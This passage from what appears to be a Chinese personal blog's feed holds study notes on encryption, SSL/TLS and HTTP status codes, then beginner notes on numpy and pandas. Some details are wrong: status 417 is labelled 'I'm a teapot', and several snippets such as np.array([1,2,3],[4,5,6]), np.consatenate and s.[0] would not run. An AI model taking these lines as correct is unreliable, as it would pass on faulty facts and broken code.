title="五、对称&#x2F;非对称数据加密"></a>五、对称&#x2F;非对称数据加密</h1><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><p>概念：加密算法是公开的，靠的是秘钥来加密数据，使用一个秘钥加密，必须使用相同的秘钥才解密。<br>优点： 算法公开、计算量小、加密速度快、加密效率高<br>缺点：在数据传送前，发送方和接收方必须商定好秘钥，然后使双方都能保存好秘钥。</p><p>常见算法：DES、3DES、Blowfish、IDEA、RC4、RC5、RC6 和 AES</p><h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><p>概念：加密和解密使用不同的秘钥，一把公开的公钥，一把私有的私钥。公钥加密的信息只有私钥才能解密，私钥加密的信息只有公钥才能解密。<br>优点：安全，即使密文被拦截、公钥被获取，但是无法获取到私钥，也就无法破译密文。作为接收方，务必要保管好自己的密钥。<br>缺点：加密算法及其复杂，安全性依赖算法与密钥，而且加密和解密效率很低。</p><p>常见算法：RSA、DSA、ECC<br>工作流程：A生成一对非对称秘钥，将公钥向所有人公开，B拿到A的公钥后使用A的公钥对信息加密后发送给A，经过加密的信息只有A手中的私钥能解密。这样B可以通过这种方式将自己的公钥加密后发送给A，两方建立起通信，可以通过对方的公钥加密要发送的信息，接收方用私钥解密信息。</p><h1 id="六、SSL-TLS协议（443端口-传输层）"><a href="#六、SSL-TLS协议（443端口-传输层）" class="headerlink" title="六、SSL&#x2F;TLS协议（443端口 传输层）"></a>六、SSL&#x2F;TLS协议（443端口 传输层）</h1><p>SSL（安全套接字层）及其后继者TLS（传输层安全）是用于在联网计算机之间建立经过身份验证和加密的链接的协议。尽管SSL协议在 1999年已经随着TLS 1.0的发布而被弃用，但我们仍将这些相关技术称为“SSL”或“SSL&#x2F;TLS”。那么SSL协议的定义是什么呢？本文将为你详细介绍，并解答关于SSL和TLS的一些常见问题。</p><p><strong>一、SSL协议是什么？</strong></p><p>SSL（Secure Sockets Layer）协议是一种用于保证网络通信安全的加密协议，最新的版本为TLS（Transport Layer Security）。SSL&#x2F;TLS协议<strong>工作在传输层</strong>，用于加密数据的传输，可以保证数据在传输过程中不被窃取、篡改或者伪造，是现代互联网应用程序中最广泛使用的一种安全协议。</p><p><strong>二、什么是</strong> <strong>SSL 证书？</strong></p><p><a href="https://link.zhihu.com/?target=https://www.racent.com/ssl">SSL 证书</a>，也称为 TLS 或 SSL&#x2F;TLS 证书，是将网站的身份绑定到由公钥和私钥组成的加密密钥对的数字文档。证书中包含的公钥允许 Web浏览器通过TLS和HTTPS协议启动与Web服务器的加密通信会话。私钥在服务器上保持安全，用于对网页和其他文档进行数字签名。</p><p><strong>三、什么是</strong> <strong>TLS？</strong></p><p>TLS（传输层安全）于1999年发布，是用于身份验证和加密的SSL（安全套接字层）协议的继承者。TLS 1.3 在RFC 8446（2018 年 8 月）中定义。</p><p><strong>四、建议在哪个端口上使用</strong> <strong>SSL&#x2F;TLS？</strong></p><p>SSL&#x2F;TLS可以使用任何端口，但是为了获得最大的兼容性，更推荐标准的端口443用于安全 SSL&#x2F;TLS 通信。</p><p><strong>五、当前版本的</strong> <strong>SSL&#x2F;TLS 是什么？</strong></p><p>当前版本的SSL&#x2F;TLS包括：TLS 1.3由RFC 8446于2018年8月定义，是 SSL&#x2F;TLS 的最新版本；TLS 1.2 (RFC 5246)于2008年8月定义，并且仍在广泛使用。TLS 1.2 之前的 SSL&#x2F;TLS 版本被认为是不安全的，不应再使用。</p><h1 id="七、状态码"><a href="#七、状态码" class="headerlink" title="七、状态码"></a>七、状态码</h1><h1 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码"></a>HTTP 状态码</h1><p>当浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含 HTTP 状态码的信息头（server header）用以响应浏览器的请求。</p><p>HTTP 状态码的英文为 <strong>HTTP Status Code</strong>。</p><p>下面是常见的 HTTP 状态码：</p><ul><li><strong>1xx（信息性状态码）</strong>：表示接收的请求正在处理。</li><li><strong>2xx（成功状态码）</strong>：表示请求正常处理完毕。</li><li><strong>3xx（重定向状态码）</strong>：需要后续操作才能完成这一请求。</li><li><strong>4xx（客户端错误状态码）</strong>：表示请求包含语法错误或无法完成。</li><li><strong>5xx（服务器错误状态码）</strong>：服务器在处理请求的过程中发生了错误。</li></ul><h2 id="HTTP-状态码分类"><a href="#HTTP-状态码分类" class="headerlink" title="HTTP 状态码分类"></a>HTTP 状态码分类</h2><p>HTTP 状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型。响应分为五类：信息响应(100–199)，成功响应(200–299)，重定向(300–399)，客户端错误(400–499)和服务器错误 (500–599)：</p><table><thead><tr><th>分类</th><th>分类描述</th></tr></thead><tbody><tr><td>1**</td><td>信息，服务器收到请求，需要请求者继续执行操作</td></tr><tr><td>2**</td><td>成功，操作被成功接收并处理</td></tr><tr><td>3**</td><td>重定向，需要进一步的操作以完成请求</td></tr><tr><td>4**</td><td>客户端错误，请求包含语法错误或无法完成请求</td></tr><tr><td>5**</td><td>服务器错误，服务器在处理请求的过程中发生了错误</td></tr></tbody></table><p>HTTP状态码列表:</p><table><thead><tr><th>状态码</th><th>状态码英文名称</th><th>中文描述</th></tr></thead><tbody><tr><td>100</td><td>Continue</td><td>继续。客户端应继续其请求</td></tr><tr><td>101</td><td>Switching Protocols</td><td>切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td></tr><tr><td></td><td></td><td></td></tr><tr><td>200</td><td>OK</td><td>请求成功。一般用于GET与POST请求</td></tr><tr><td>201</td><td>Created</td><td>已创建。成功请求并创建了新的资源</td></tr><tr><td>202</td><td>Accepted</td><td>已接受。已经接受请求，但未处理完成</td></tr><tr><td>203</td><td>Non-Authoritative Information</td><td>非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td>204</td><td>No Content</td><td>无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td>205</td><td>Reset Content</td><td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td>206</td><td>Partial Content</td><td>部分内容。服务器成功处理了部分GET请求</td></tr><tr><td></td><td></td><td></td></tr><tr><td>300</td><td>Multiple Choices</td><td>多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td>302</td><td>Found</td><td>临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td>303</td><td>See Other</td><td>查看其它地址。与301类似。使用GET和POST请求查看</td></tr><tr><td>304</td><td>Not Modified</td><td>未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td>305</td><td>Use Proxy</td><td>使用代理。所请求的资源必须通过代理访问</td></tr><tr><td>306</td><td>Unused</td><td>已经被废弃的HTTP状态码</td></tr><tr><td>307</td><td>Temporary Redirect</td><td>临时重定向。与302类似。使用GET请求重定向</td></tr><tr><td></td><td></td><td></td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求的语法错误，服务器无法理解</td></tr><tr><td>401</td><td>Unauthorized</td><td>请求要求用户的身份认证</td></tr><tr><td>402</td><td>Payment Required</td><td>保留，将来使用</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td>404</td><td>Not Found</td><td>服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td></tr><tr><td>405</td><td>Method Not Allowed</td><td>客户端请求中的方法被禁止</td></tr><tr><td>406</td><td>Not Acceptable</td><td>服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td>407</td><td>Proxy Authentication Required</td><td>请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td></tr><tr><td>408</td><td>Request Time-out</td><td>服务器等待客户端发送的请求时间过长，超时</td></tr><tr><td>409</td><td>Conflict</td><td>服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td></tr><tr><td>410</td><td>Gone</td><td>客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td></tr><tr><td>411</td><td>Length Required</td><td>服务器无法处理客户端发送的不带Content-Length的请求信息</td></tr><tr><td>412</td><td>Precondition Failed</td><td>客户端请求信息的先决条件错误</td></tr><tr><td>413</td><td>Request Entity Too Large</td><td>由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td></tr><tr><td>414</td><td>Request-URI Too Large</td><td>请求的URI过长（URI通常为网址），服务器无法处理</td></tr><tr><td>415</td><td>Unsupported Media Type</td><td>服务器无法处理请求附带的媒体格式</td></tr><tr><td>416</td><td>Requested range not satisfiable</td><td>客户端请求的范围无效</td></tr><tr><td>417</td><td>I’m a teapot</td><td>服务器无法满足Expect的请求头信息</td></tr><tr><td>418</td><td>I’m a teapot</td><td>状态码 418 实际上是一个愚人节玩笑。它在 RFC 2324 中定义，该 RFC 是一个关于超文本咖啡壶控制协议（HTCPCP）的笑话文件。在这个笑话中，418 状态码是作为一个玩笑加入到 HTTP 协议中的。</td></tr><tr><td></td><td></td><td></td></tr><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误，无法完成请求</td></tr><tr><td>501</td><td>Not Implemented</td><td>服务器不支持请求的功能，无法完成请求</td></tr><tr><td>502</td><td>Bad Gateway</td><td>作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td></tr><tr><td>503</td><td>Service Unavailable</td><td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td>504</td><td>Gateway Time-out</td><td>充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td>505</td><td>HTTP Version not supported</td><td>服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据分析相关</title>
      <link href="/2024/04/27/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3/"/>
      <url>/2024/04/27/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h2 id="数据分析是干啥的"><a href="#数据分析是干啥的" class="headerlink" title="数据分析是干啥的"></a>数据分析是干啥的</h2><p>-整合一堆杂乱无章的数据 把背后的信息提炼出来 使数据的价值最大化<br>–分析用户的消费行为 指定相应的方案 调整促销时间 力度 计算用户活跃度和产品的回购力度<br>–分析广告的点击率 决定广告的投放时间 制定广告方案 决定投放等等</p><p>例：<br>1.保险公司从大量的赔付申请数据中判断哪些存在骗保可能<br>2.支付宝通过用户消费记录和行为自动调整花呗额度<br>3.短视频通过用户的点击和观看行为给用户推送合适的视频</p><h2 id="我为啥要学数据分析"><a href="#我为啥要学数据分析" class="headerlink" title="我为啥要学数据分析"></a>我为啥要学数据分析</h2><p><del>因为我现在就得用</del><br>可以用于某些岗位或竞赛<br>python数据科学的基础<br>机器学习课程的基础</p><h2 id="数据分析的流程"><a href="#数据分析的流程" class="headerlink" title="数据分析的流程"></a>数据分析的流程</h2><p>提出问题<br>准备数据<br>分析数据<br>获得结论<br>成果可视化</p><h2 id="要用的工具"><a href="#要用的工具" class="headerlink" title="要用的工具"></a>要用的工具</h2><p>-numpy<br>-pandas<br>-matplotlib</p><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>-anaconda|全球最受欢迎的数据啥啥啥|集成了数据分析和机器学习需要的全部环境<br>注意：安装目录不能有中文和特殊符号<br>-jupyter|anaconda提供的基于浏览器的<strong>可视化开发工具</strong><br>启动方式：cmd-jupyter notebook-回车<br>新建方式：图形化页面-new-文件或者文件夹<br>python3：anaconda中的源文件<br>cell:可以在里面执行相关代码 code模式是代码 markdown模式是笔记<br>可以在编辑页面更换<br>快捷键：添加cell-a或者b<br>删除-x<br>修改cell的模式-m：修改成markdown<br>y：修改成code模式<br>执行cell-shift+enter<br>tab：自动补全<br>代开帮助文档：shift+tab</p><h2 id="numpy模块的使用"><a href="#numpy模块的使用" class="headerlink" title="numpy模块的使用"></a>numpy模块的使用</h2><p>创建numpy</p><h3 id="1-1创建一个一维数组"><a href="#1-1创建一个一维数组" class="headerlink" title="1.1创建一个一维数组"></a><strong>1.1创建一个一维数组</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">arr = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">arr <span class="comment">#cell中输出的时候直接打元素名就行 不用echo</span></span><br><span class="line">输出：</span><br><span class="line">array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br></pre></td></tr></table></figure><h3 id="1-2创建一个多维数组"><a href="#1-2创建一个多维数组" class="headerlink" title="1.2创建一个多维数组"></a><strong>1.2创建一个多维数组</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arr = np.array([1,2,3],[4,5,6])</span><br><span class="line">arr</span><br><span class="line">输出：</span><br><span class="line">array([1,2,3],</span><br><span class="line">[4,5,6])</span><br></pre></td></tr></table></figure><p>数组和列表的区别是什么呢？<br>-数组中存储的数据元素类型都是统一的<br>-优先级：字符串&gt;浮点型&gt;整数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">arr = np.array([1,2.2,3])</span><br><span class="line">arr</span><br><span class="line">输出：</span><br><span class="line">array([1.,2.2,3.])</span><br></pre></td></tr></table></figure><h3 id="2-1将外部的一张图片读取并加载到numpy数组中"><a href="#2-1将外部的一张图片读取并加载到numpy数组中" class="headerlink" title="2.1将外部的一张图片读取并加载到numpy数组中"></a>2.1将外部的一张图片读取并加载到numpy数组中</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">img\_arr = plt.imread(<span class="string">&#x27;./1.jpg&#x27;</span>) <span class="comment">#返回的数组，数组中装载的就是图片内容</span></span><br><span class="line">plt.imshow(img\_arr) <span class="comment">#将numpy数组进行可视化展示</span></span><br></pre></td></tr></table></figure><p>输出结果即为1.jpg的图像内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">img\_arr = img\_arr - <span class="number">100</span> <span class="comment">#将每一个数组元素都减去100</span></span><br><span class="line">plt.imshow(img\_arr)</span><br></pre></td></tr></table></figure><p>输出结果是色调有差别的图像内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">np.ones(shape=(<span class="number">3</span>,<span class="number">4</span>)) <span class="comment">#输出结果是一个三行 四列的数组</span></span><br><span class="line">np.linspace(<span class="number">0</span>,<span class="number">100</span>,num=<span class="number">20</span>) <span class="comment">#项数为20的一维等差数列数组</span></span><br><span class="line">np.arange(<span class="number">10</span>,<span class="number">50</span>,step=<span class="number">2</span>) <span class="comment">#返回了10开头 50结尾 公差为2的一维数组</span></span><br><span class="line">np.random.randint(<span class="number">0</span>,<span class="number">100</span>,size=(<span class="number">5</span>,<span class="number">6</span>)) <span class="comment">#生成一个五行六列的数组 内容为随机数</span></span><br><span class="line">数组名.shape <span class="comment">#输出为数组的形状(行数，列数)</span></span><br><span class="line">数组名.ndim <span class="comment">#返回的是数组的维度(数组里包了几个数组)</span></span><br><span class="line">数组名.size <span class="comment">#返回数组元素的个数</span></span><br><span class="line">数组名.dtype <span class="comment">#返回数组元素的类型</span></span><br><span class="line">创建数组的时候输入dtype参数来指定元素类型</span><br><span class="line">或者通过 数组名.dtype = “指定类型” 来修改</span><br><span class="line"><span class="built_in">type</span>(数组名) <span class="comment">#返回数组的数据类型</span></span><br></pre></td></tr></table></figure><h2 id="3-1numpy的索引和切片操作"><a href="#3-1numpy的索引和切片操作" class="headerlink" title="3.1numpy的索引和切片操作"></a>3.1numpy的索引和切片操作</h2><p>索引和列表同理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">创建一个数组之后 我们可以取出数组的指定数据</span><br><span class="line">数组名[<span class="number">1</span>,<span class="number">4</span>] <span class="comment">#取出数组中下标为1,4的数据</span></span><br><span class="line">数组名[<span class="number">0</span>：<span class="number">2</span>] <span class="comment">#切出数组前两行的数据</span></span><br><span class="line">数组名[:,<span class="number">0</span>:<span class="number">2</span>] <span class="comment">#切出数组前两列的数据</span></span><br><span class="line">数组名[<span class="number">0</span>:<span class="number">2</span>,<span class="number">0</span>:<span class="number">2</span>] <span class="comment">#切出数组前两行前两列的数据</span></span><br><span class="line">数组名[::-<span class="number">1</span>] <span class="comment">#将数组的行倒置</span></span><br><span class="line">数组名[:,::-<span class="number">1</span>] <span class="comment">#将数组的列倒置</span></span><br><span class="line">数组名[::-<span class="number">1</span>,::-<span class="number">1</span>] <span class="comment">#整个倒置</span></span><br><span class="line">左右反转图片</span><br><span class="line">img\_arr = plt.imread(<span class="string">&#x27;./1.jpg&#x27;</span>) <span class="comment">#返回的数组，数组中装载的就是图片内容</span></span><br><span class="line">plt.imshow(img\_arr[:,::-<span class="number">1</span>,:]) <span class="comment">#三个数值分别代表行 列 颜色</span></span><br><span class="line">上下反转图片</span><br><span class="line">plt.imshow(img\_arr[::-<span class="number">1</span>,:,:]) <span class="comment">#三个数值分别代表行 列 颜色</span></span><br><span class="line">图片裁剪功能</span><br><span class="line">plt.imshow(img\_arr[<span class="number">66</span>:<span class="number">200</span>,<span class="number">78</span>:<span class="number">300</span>,:]) <span class="comment">#三个数值分别代表行 列 颜色</span></span><br><span class="line">变形（reshape）</span><br><span class="line">数组名.reshape((<span class="number">30</span>,)) <span class="comment">#把二维的数组变形成一维</span></span><br><span class="line">数组名.reshape((<span class="number">2</span>,<span class="number">15</span>)) <span class="comment">#将一维变形成多维</span></span><br><span class="line">数组名.reshape((<span class="number">6</span>,<span class="number">5</span>)) <span class="comment">#将一维变形成多维</span></span><br><span class="line">级联操作</span><br><span class="line">-将多个numpy数组进行横向纵向的拼接</span><br><span class="line">axis轴向</span><br><span class="line"><span class="number">0</span>为列 纵向拼接 <span class="number">1</span>为行 横向拼接（行与列无法对应会报错哦）</span><br><span class="line">np.consatenate((数列<span class="number">1</span>,数列<span class="number">2</span>),axis=<span class="number">1</span>)</span><br><span class="line">图片的拼接</span><br><span class="line">np.consatenate((数列<span class="number">1</span>,数列<span class="number">2</span>,数列<span class="number">3</span>),axis=<span class="number">1</span>)</span><br><span class="line">plt.imshow(img\_arr) <span class="comment">#三个数值分别代表行 列 颜色</span></span><br><span class="line">常用聚合操作</span><br><span class="line">-<span class="built_in">sum</span>,<span class="built_in">max</span>,<span class="built_in">min</span>,mean</span><br><span class="line">计算和 最大值 最小值 求均值</span><br><span class="line">-sin,cos,tan</span><br><span class="line">三角函数</span><br><span class="line">around(a,decimals)</span><br><span class="line">a:数组名 decimals:舍入的小数位数</span><br><span class="line">numpy.amin()和numpy.amax(),用于计算数组中的元素沿指定轴的最小、最大值。</span><br><span class="line">numpy.ptp(),计算数组中元素最大值与最小值的差</span><br><span class="line">numpy.median(),计算数组中元素的中位数</span><br><span class="line">std() var()输出标准差与方差 方差就是标准差的平方</span><br><span class="line">使用例:</span><br><span class="line">数组名[<span class="number">1</span>].std() <span class="comment">#输出第一行的标准差</span></span><br><span class="line">还有数学里的矩阵相加 相减 相乘</span><br><span class="line">eye() <span class="comment">#返回一个标准的单位矩阵</span></span><br><span class="line">.T <span class="comment">#转置矩阵（行变成列 列变成行）</span></span><br><span class="line">np.dot(数列<span class="number">1</span>,数列<span class="number">2</span>) <span class="comment">#两个数列相乘</span></span><br></pre></td></tr></table></figure><h2 id="panda基础操作"><a href="#panda基础操作" class="headerlink" title="panda基础操作"></a>panda基础操作</h2><p>numpy是用来处理数值型的数据 还有很多其他类型的数据(字符串，时间序列)<br>那么什么是pandas捏？<br>首先来认识pandas中的两个常用的类<br>-Series<br>-DataFrame<br>Series是一种类似于一维数组的对象，由下面两个部分组成:<br>values:一组数据<br>index:相关的数据索引标签<br>Series的创建<br>-由列表或numpy数组创建。<br>-由字典创建</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pandas <span class="keyword">import</span> Series</span><br><span class="line">s = Series(data=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;four&#x27;</span>])</span><br><span class="line">s</span><br><span class="line"><span class="comment">#输出结果类似于卡西欧(是的就是计算器)的数组表现形式</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">3</span> four</span><br><span class="line">dtype:<span class="built_in">object</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">Series(data=np.random.randint(<span class="number">0</span>,<span class="number">100</span>,size=(<span class="number">3</span>,<span class="number">1</span>)))</span><br><span class="line"><span class="comment">#必须是一维数组 不然会报错</span></span><br><span class="line"><span class="number">0</span> <span class="number">3</span></span><br><span class="line"><span class="number">1</span> <span class="number">43</span></span><br><span class="line"><span class="number">2</span> <span class="number">82</span></span><br><span class="line">dtype:int64</span><br><span class="line"><span class="keyword">from</span> pandas <span class="keyword">import</span> Series</span><br><span class="line"><span class="comment">#index用来指定显示索引</span></span><br><span class="line">s = Series(data=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;four&#x27;</span>],index=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>])</span><br><span class="line">s</span><br><span class="line">a <span class="number">1</span></span><br><span class="line">b <span class="number">2</span></span><br><span class="line">c <span class="number">3</span></span><br><span class="line">d four</span><br><span class="line">dtype:<span class="built_in">object</span></span><br><span class="line"><span class="comment">#显示索引可以增强Series的可读性</span></span><br><span class="line">dic = &#123;</span><br><span class="line"><span class="string">&#x27;语文&#x27;</span>:<span class="number">100</span>,</span><br><span class="line"><span class="string">&#x27;数学&#x27;</span>:<span class="number">99</span>,</span><br><span class="line"><span class="string">&#x27;理综&#x27;</span>:<span class="number">250</span>,</span><br><span class="line">&#125;</span><br><span class="line">s = Series(data=dic)</span><br><span class="line">s</span><br><span class="line">语文 <span class="number">100</span></span><br><span class="line">数学 <span class="number">99</span></span><br><span class="line">理综 <span class="number">250</span></span><br><span class="line">dtype:int64</span><br><span class="line">s.[<span class="number">0</span>]</span><br><span class="line"><span class="number">100</span></span><br><span class="line">s.语文</span><br><span class="line"><span class="number">100</span></span><br><span class="line">s[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">语文 <span class="number">100</span></span><br><span class="line">数学 <span class="number">99</span></span><br><span class="line">dtype:int64</span><br><span class="line">s.shape <span class="comment">#返回Series的形状</span></span><br><span class="line">s.size <span class="comment">#返回Series元素的个数</span></span><br><span class="line">s.index <span class="comment">#返回Series的索引</span></span><br><span class="line">s.values <span class="comment">#返回Series的值</span></span><br><span class="line">s.dtype <span class="comment">#返回元素类型 o代表object(字符串)</span></span><br><span class="line">s.head(n) <span class="comment">#前n个数据</span></span><br><span class="line">s.tail(n) <span class="comment">#后n个元素</span></span><br><span class="line">s.unique <span class="comment">#去重</span></span><br><span class="line">s.isnull <span class="comment">#判断元素是否为空 空返回Ture 反之False</span></span><br><span class="line">s.notnull <span class="comment">#反之</span></span><br><span class="line">Series的算术运算</span><br><span class="line">直接 a = 数组<span class="number">1</span>+数组<span class="number">2</span>即可</span><br><span class="line">index一致的元素会进行算数运算 否则算空</span><br></pre></td></tr></table></figure><p>————————————————————————————————————————<br>那么接下来是DataFrame 他是一个表格型的数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pandas <span class="keyword">import</span> DataFrame</span><br><span class="line">df = DataFrame(data=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>])</span><br><span class="line">df</span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">2</span></span><br><span class="line">————————</span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">1</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span></span><br><span class="line">df = DataFrame(data=np.random.randint(<span class="number">0</span>,<span class="number">100</span>,size=(<span class="number">6</span>,<span class="number">4</span>)))</span><br><span class="line">df</span><br><span class="line"><span class="comment">#输出结果为一个六行四列 内容为0-100随机数的表格</span></span><br><span class="line">dic = &#123;</span><br><span class="line"><span class="string">&#x27;name&#x27;</span>:[<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;lisi&#x27;</span>,<span class="string">&#x27;wanglaowu&#x27;</span>],</span><br><span class="line"><span class="string">&#x27;salary&#x27;</span>:[<span class="number">1000</span>,<span class="number">2000</span>,<span class="number">3000</span>]</span><br><span class="line">&#125;</span><br><span class="line">df = 